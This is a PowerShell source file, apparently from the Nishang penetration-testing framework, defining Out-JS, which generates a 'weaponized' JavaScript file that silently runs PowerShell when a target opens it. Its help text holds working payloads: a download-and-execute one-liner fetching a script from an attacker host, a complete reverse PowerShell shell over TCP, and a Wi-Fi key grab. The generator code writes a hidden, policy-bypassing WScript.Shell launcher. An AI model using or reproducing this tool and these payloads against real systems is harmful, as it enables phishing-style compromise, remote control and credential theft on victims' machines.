﻿function Out-JS
{
<#
.SYNOPSIS
Nishang script useful for creating "weaponized" JavaScript which could be used to run PowerShell commands and scripts.

.DESCRIPTION
The script generates a JavaScript file. The JavaScript file (default name Style.js) needs to be sent to a target. 
As soon as a target user opens the JS file, the specified payload will be executed. 


The script is based on the work by Casey Smith (@subTee)

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the PowerShell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the PowerShell script to be executed on the target.

.PARAMETER OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.EXAMPLE
PS > Out-JS -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Style.js" would be generated in the current directory.


PS > Out-JS -PayloadURL http://192.168.230.1/Powerpreter.psm1 -Arguments "Get-Information;Get-Wlan-Keys"

Use above command for multiple payloads.


PS > Out-JS -Payload "`$sm=(New-Object Net.Sockets.TCPClient('192.168.230.154',443)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> ';`$sb=([text.encoding]::ASCII).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}"

Use above for a Reverse PowerShell Session. Note that there is no need of download-execute in this case.

.LINK
http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
https://github.com/samratashok/nishang
#> 

    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\Style.js"
    )

    #Check if the payload has been provided by the user
    if(!$Payload)
    {
        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }  
    
    $cmd = @"
ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
c = "$Payload";
r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
"@

    Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
    Write-Output "Weaponized JS file written to $OutputPath"
}